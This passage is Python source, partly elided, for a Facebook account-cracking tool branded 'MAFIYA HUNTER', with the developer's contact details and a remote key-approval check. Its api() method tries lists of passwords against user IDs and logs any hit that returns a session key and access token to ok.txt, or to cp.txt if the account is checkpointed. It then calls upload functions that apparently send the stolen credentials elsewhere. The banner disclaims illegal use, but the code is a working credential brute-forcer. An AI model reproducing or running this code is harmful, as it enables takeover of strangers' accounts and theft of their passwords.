# decoder by cobra linux command __Tools Owner Mafiya Hunter
# https://github.com/Mafiyahunter/MHunter.git
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/100066332015845"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100066332015845")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +9199971945685")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Mafiyahunter/MHunter/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m##     ## ##     ## ##       ####    ##    ##     ## 
 ...
 > \033[0;92mDEVELOPER     : MAFIYA HUNTER
 > \033[0;95mFACEBOOK ID   : IM YOUR FATHER
 > \033[0;41mWHATSAPP      : +919971945685
 \033[0;96m> TEAM       : TOM+ MAFIYA
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MAFIYA] : %s/%s -> \033[0;92m [ MAFIYA-OK:%s ]- \033[0;93m[MAFIYA-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MAFIYA-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MAFIYA-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MAFIYA-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
